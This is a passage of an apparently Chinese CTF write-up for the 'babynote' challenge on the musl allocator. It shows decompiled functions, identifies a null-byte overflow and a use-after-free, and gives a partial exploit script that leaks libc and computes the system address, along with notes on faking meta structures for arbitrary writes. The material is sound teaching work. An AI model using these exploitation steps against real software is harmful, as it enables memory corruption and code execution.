class=\"comment\">--------menu-------</span></span><br><span class=\"line\"><span class=\"comment\">1: add a note</span></span><br><span class=\"line\"><span class=\"comment\">2: find a note</span></span><br><span class=\"line\"><span class=\"comment\">3: delete a note</span></span><br><span class=\"line\"><span class=\"comment\">4: forget all notes</span></span><br><span class=\"line\"><span class=\"comment\">5: exit</span></span><br><span class=\"line\"><span class=\"comment\">option:</span></span><br></pre></td></tr></table></figure>\n<p>发现并没有 edit 的功能。</p>\n<p>反汇编以后，对于结构体的认知。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000</span> babynote        struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x28</span>, mappedto_6)</span><br><span class=\"line\"><span class=\"number\">00000000</span> name            dq ?</span><br><span class=\"line\"><span class=\"number\">00000008</span> note            dq ?</span><br><span class=\"line\"><span class=\"number\">00000010</span> name_size       dq ?</span><br><span class=\"line\"><span class=\"number\">00000018</span> note_size       dq ?</span><br><span class=\"line\"><span class=\"number\">00000020</span> next            dq ?</span><br><span class=\"line\"><span class=\"number\">00000028</span> babynote        ends</span><br></pre></td></tr></table></figure>\n<p>存在一个全局数组，储存了 abbynote 的指针，形成一个单链表。采用头插法进行添加。</p>\n<h3 id=\"add\"><a class=\"markdownIt-Anchor\" href=\"#add\">#</a> add</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  babynote *ptr; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  ptr = (babynote *)<span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  ptr-&gt;name_size = addname(&amp;ptr-&gt;name);</span><br><span class=\"line\">  ptr-&gt;note_size = addnote(&amp;ptr-&gt;note);</span><br><span class=\"line\">  ptr-&gt;next = (__int64)<span class=\"built_in\">list</span>;</span><br><span class=\"line\">  <span class=\"built_in\">list</span> = (babynote **)ptr;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;ok&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/*--------------------------------------------------------*/</span></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">addname</span><span class=\"params\">(__int64 *ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name size: &quot;</span>);</span><br><span class=\"line\">  size = getnum();</span><br><span class=\"line\">  *ptr = (__int64)<span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, size);           <span class=\"comment\">// calloc清空数据</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)readnode(*ptr, size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">readnode</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; a2 &gt; (<span class=\"type\">int</span>)i; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">1uLL</span>) != <span class=\"number\">1</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">    *(_BYTE *)(a1 + (<span class=\"type\">int</span>)i) = buf;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( buf == <span class=\"string\">&#x27;\\n&#x27;</span> )                          <span class=\"comment\">// 一字节\\x00溢出</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)((<span class=\"type\">int</span>)i + a1) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/*--------------------------------------------------------*/</span></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">addnote</span><span class=\"params\">(<span class=\"type\">void</span> *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;note size: &quot;</span>);</span><br><span class=\"line\">  size = getnum();</span><br><span class=\"line\">  *(_QWORD *)a1 = <span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, size);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;note content: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)readnode(*(_QWORD *)a1, size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>add 添加时，ida 分析的结果并不准确，这里永远存在一字节的空溢出。</p>\n<p>后来根据网上查到的学习资料。由于 musl 的堆管理比较简单，这个空溢出可以用来修改 chunk 的 idx 位，伪造 meta。</p>\n<p>后面再说。</p>\n<h3 id=\"find\"><a class=\"markdownIt-Anchor\" href=\"#find\">#</a> find</h3>\n<p>find 会创建一个 name 的 chunk, 然后根据 size 以及 list 保留的 size,cmp，最后比较字符串。如果相同就返回第一个找到的符合要求的 babynote 指针。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">find</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *ptr; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  babynote *v3; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  ptr = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  size = addname(&amp;ptr);</span><br><span class=\"line\">  v3 = cmp(ptr, size);                          <span class=\"comment\">// 确认数据</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 )</span><br><span class=\"line\">    info(v3-&gt;note, v3-&gt;note_size);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;oops.....&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//输出babynote的信息</span></span><br><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">info</span><span class=\"params\">(<span class=\"type\">char</span> *a1, <span class=\"type\">unsigned</span> __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%#lx:&quot;</span>, a2);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; a2 &gt; i; ++i )</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%02x&quot;</span>, a1[i]);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出的信息也会收到 size 的限制。当时我有看到一个点，就是 i 是有符号的，而 a2 无符号。但是貌似没有什么价值。最后 free 那个临时创建的 chunk.</p>\n<h3 id=\"delete\"><a class=\"markdownIt-Anchor\" href=\"#delete\">#</a> delete</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">delete</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  babynote *v1; <span class=\"comment\">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class=\"line\">  babynote **i; <span class=\"comment\">// [rsp+10h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  babynote *ptr; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v1 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  size = addname(&amp;v1);</span><br><span class=\"line\">  ptr = cmp(v1, size);                          <span class=\"comment\">// /删除某个特定的</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ptr != <span class=\"built_in\">list</span> || <span class=\"built_in\">list</span>-&gt;next )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ptr-&gt;next )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( i = &amp;<span class=\"built_in\">list</span>; ptr != *i; i = &amp;(*i)-&gt;next )</span><br><span class=\"line\">          ;</span><br><span class=\"line\">        *i = ptr-&gt;next;</span><br><span class=\"line\">      &#125;                                         <span class=\"comment\">// 解链表</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">list</span> = <span class=\"number\">0LL</span>;                               <span class=\"comment\">// 删除头指针，就清空了所有</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr-&gt;name);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr-&gt;note);                            <span class=\"comment\">// 释放note</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;ok&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;oops.....&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(v1);                                     <span class=\"comment\">// 删除临时结构体</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>删除 note 的时候，会遍历链表，找到对应的指针后，会 set 对应结构的 next 指针。p-&gt;next = p-&gt;next-&gt;next. 但是如果 ptr 是尾指针，就不会进行 set. 存在 UAF</p>\n<h2 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用</h2>\n<p>delete 最后一个，只会 free 对应的堆块，但是倒数第二个 babynote 的 next 没有 reset, 所以就存在了 uaf. 但是 musl 的堆块释放后并不会进入 bins。只有 meta 的所有 avail_maks 都被释放后才会将 meta 释放，并把 meta 放入双链表，dequeue（所以 meta free 后是）</p>\n<p>程序的了漏洞在于 delete 时存在的 UAF, 如果我们将其释放后，并对其 note 进行 reuse, 而且用作 babbynote, 就会在 slot 上储存 3 个指针，导致 heapaddr 泄露。但是这里需要布置对的结构。</p>\n<p><em><strong><u>musl 的堆比较特殊，meta 页是按照顺序申请的，而且与 group 页隔离。当同一个 size 的 meta 分配满之后，如果继续申请，会使用 avail_meta 保留的一个 meta 地址，当然这了 meta 是全新的。而且，一旦申请后，malloc_context active 数组对应位置就会保留正在分配的 meta. 同时会将这两个 meta 的 prev next 设置，形成双链表。如果其中一个 meta 满无法分配，或者被 free，就会解开连表。full_meta 的 prev 和 next 被清零。</u></strong></em></p>\n<h3 id=\"泄露libc\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc\">#</a> 泄露 libc</h3>\n<p>回到题目，这里我们可以泄露 group 组的地址，slot 地址是在 libc 的基础上得到的，所以泄露出 heap 的用户区地址就可以得到里 libc 地址。</p>\n<p>我们利用堆风水，将链表的最后一个 bebynote 释放，存在 uaf，然后通过构造，拿到他的 note slot 作为一个新的 babynote, 这杨这里就储存了 heapd 的地址，然后泄露。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#slot full size is 0x2c</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x50</span>)<span class=\"comment\">#slot full size is 0x6c</span></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;a&#x27;</span>)\t\t\t\t<span class=\"comment\">#free the first note,the meta(0xc)is freed,</span></span><br><span class=\"line\">clean()\t\t\t\t\t<span class=\"comment\">#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>)\t\t<span class=\"comment\">#we alloc the last slot in meta(0x2c) for abynote,</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">#.Reuse the 0 solt in meta(0xc) (malloc from bins),</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">#then reuse the free slot in meta(0x2c)</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>,<span class=\"string\">b&#x27;b&#x27;</span>)\t\t\t<span class=\"comment\">#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;a&#x27;</span>)\t\t\t<span class=\"comment\">#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#fill up meta2(0x2c)</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;f&#x27;</span>,<span class=\"string\">b&#x27;f&#x27;</span>*<span class=\"number\">0x50</span>)\t\t<span class=\"comment\">#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, </span></span><br><span class=\"line\"></span><br><span class=\"line\">find(<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;0x28:&quot;</span>)</span><br><span class=\"line\">ss = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">\tss = r.recv(<span class=\"number\">2</span>)+ss</span><br><span class=\"line\">ss  = <span class=\"string\">b&#x27;0x&#x27;</span>+ss</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ss)</span><br><span class=\"line\">libcbase = <span class=\"built_in\">int</span>(ss,<span class=\"number\">16</span>) -  <span class=\"number\">0x29fdf0</span></span><br><span class=\"line\">stdout = libcbase + <span class=\"number\">0x2a0e00</span></span><br><span class=\"line\">system = libcbase + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">__malloc_context = <span class=\"number\">0x2a1aa0</span>+libcbase</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;stdout : &quot;</span>,<span class=\"built_in\">hex</span>(stdout))</span><br></pre></td></tr></table></figure>\n<h3 id=\"泄露其他地址meta\"><a class=\"markdownIt-Anchor\" href=\"#泄露其他地址meta\">#</a> 泄露其他地址（meta）</h3>\n<p>这里，meta1 (0x2c) 还有一个 freed slot ，我们其实就是通过这个泄露的 heap。find 一个很重要的点就是，会 addname. 而且就算查不到也不出错，然后再将其释放，所以我们可以由此来重复利用这个 freed slot。find 的时候，这要 size 合适，就会将它返回给我们，然后在里面写入数据。并释放。之前我们说过，这里可以泄露 heap 地址，是因为他是我们 list 的最后一个 banynote,delete 后上一个 babynote 的 next 指针依旧指向这个 slot，所以导致泄露。</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220420203251874.png\" alt=\"image-20220420203251874\"></p>\n<p>所以我们可以进行任意地址读。将__malloc_context 的地址写在 note 的位置，就可以泄露，同时我们还可以改变 notesize, 控制泄露的长度。</p>\n<p>由于 musl 的堆管理机制，虽然与 glibc 完全不一样，但是感觉通过代码分析是更容易的。</p>\n<h3 id=\"任意地址写\"><a class=\"markdownIt-Anchor\" href=\"#任意地址写\">#</a> 任意地址写</h3>\n<p>musl 的任意地址写与 glibc 的 unlink 核心想法一致，只不过是前面的检查方式不一样。我们一步步来分析。</p>\n<p>首先 musl 的堆块不会进入 bins，只有 meta 被释放的时候，才会加入 freed_meta 双链表。当 meta 分配出去的 slot 全部被释放的时候，meta 会被释放。</p>\n<h4 id=\"meta的-结构\"><a class=\"markdownIt-Anchor\" href=\"#meta的-结构\">#</a> meta 的 结构</h4>\n<p>meta 结构一共占用 40bytes</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> meta*)<span class=\"number\">0x55555730d4f0</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  prev = <span class=\"number\">0x55555730d4f0</span>, </span><br><span class=\"line\">  next = <span class=\"number\">0x55555730d4f0</span>, </span><br><span class=\"line\">  mem = <span class=\"number\">0x7f6431216c30</span>, </span><br><span class=\"line\">  avail_mask = <span class=\"number\">262</span>, </span><br><span class=\"line\">  freed_mask = <span class=\"number\">0</span>, </span><br><span class=\"line\">  last_idx = <span class=\"number\">9</span>, </span><br><span class=\"line\">  freeable = <span class=\"number\">1</span>, </span><br><span class=\"line\">  sizeclass = <span class=\"number\">2</span>, </span><br><span class=\"line\">  maplen = <span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">pwndbg&gt; x/8gx 0x55555730d4f0</span></span><br><span class=\"line\"><span class=\"comment\">0x55555730d4f0:\t0x000055555730d4f0\t0x000055555730d4f0</span></span><br><span class=\"line\"><span class=\"comment\">0x55555730d500:\t0x00007f6431216c30\t0x0000000000000106</span></span><br><span class=\"line\"><span class=\"comment\">0x55555730d510:\t0x00000000000000a9</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>prev 与 next 分别指向上一个或者下一个 meta（meta 在 freed_meta 链表中）。mem 指向管理 meta 的 group，而 group 又包含的一下简单信息</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> group*)<span class=\"number\">0x55555730d4f0</span></span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  meta = <span class=\"number\">0x55555730d4f0</span>, </span><br><span class=\"line\">  active_idx = <span class=\"number\">16</span> <span class=\"string\">&#x27;\\020&#x27;</span>, </span><br><span class=\"line\">  pad = <span class=\"string\">&quot;\\324\\060WUU\\000&quot;</span>, </span><br><span class=\"line\">  storage = <span class=\"number\">0x55555730d500</span> <span class=\"string\">&quot;0l!1d\\177&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>其中很多信息我们不需要管信息，只要知道用户的使用的 slot 数据在 storage 里面。这里提一下，group 其实也可以看作是一个 slot，被另一个 “meta” 管理，这里提到这个是因为，free meta 的时候，除了会释放对应的 slot，还要释放对应的 group。slot 的储存结构也比较有意思，他并不会像 glibc 的 chunk 那样保留过多的本 slot 信息，只会用四字节来保留 slot 与 meta 的关系。</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422192430250.png\" alt=\"image-20220422192430250\"></p>\n<p>1 这里是用户使用的区域，2 是 group 的信息，包括 meta</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> group*)<span class=\"number\">0x7f6431216c30</span></span><br><span class=\"line\">$<span 